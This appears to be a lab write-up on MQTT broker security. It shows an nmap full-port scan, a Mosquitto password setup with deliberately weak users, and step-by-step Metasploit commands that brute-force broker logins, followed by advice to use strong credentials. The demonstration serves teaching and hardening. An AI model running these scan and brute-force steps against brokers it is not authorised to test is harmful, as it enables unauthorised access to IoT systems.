## Not encrypted 

Since MQTT is **not encrypted**, if there is no authentication method anyone can either **listen** or **publish** if he has access to the Broker IP Address. 

All it takes is one Nmap scan to know the MQTT port.

### Nmap

You can use the [nmap](https://nmap.org/) tool to scan an IP Address. You can use this command to scan the ports:

``` shell
nmap -sC -sV -p- <ip>
```
## Brute Force Attack

### Authentication Settings

First off, we need to remove anonymous authentication from the MQTT Broker. To do so, add these lines to the **mosquitto.conf** file : 

``` shell
password_file /mosquitto/passwd_file
allow_anonymous false
```

Then, we need to create a **passw_file** and add **username:password** encrypted combinations. Go into the docker cmd and run these commands :

***Create passwd_file*** :

```
mosquitto_passwd -c passwordfile user
```

This will add a user to the file. To set its password, run this command :

```
mosquitto_passwd -b passwordfile user password
```

We created three users : 

**admin:root**
**username:password**
**anna:spiderman**
### Metasploit

We will use a Metasploit payload to demonstrate that even beginners can hack poorly setup MQTT Brokers.

We will use the payload.
To use it, we simply need to give him some infos such as : 

**RHOST** : IP Address of the broker
**PASS_FILE** : file containing a list of passwords
**USERS_FILE** : file containing a list of usernames

#### Exploit

Start by starting Metasploit using this command in a Linux CMD :

```shell
msfconsole
```

Then, run these commands in Metasploit : 

```shell
use auxiliary/scanner/mqtt/connect
```

```shell
set PASS_FILE <your_password_file>
set USER_FILE <your_users_file>
set RHOSTS <broker_ip_address>
```

and then : 
``` shell
run
```

After a while, here is the result: we stopped at the the first hit or it would take forever)

### Go further 

*Maybe retrieve password file and try johntheripper?
### Conclusion

There's no security against Brute Force on IOT Devices credentials. You can either secure your devices placing them behind Firewalls and WAF, but you **MUST** use strong IOT Credentials.
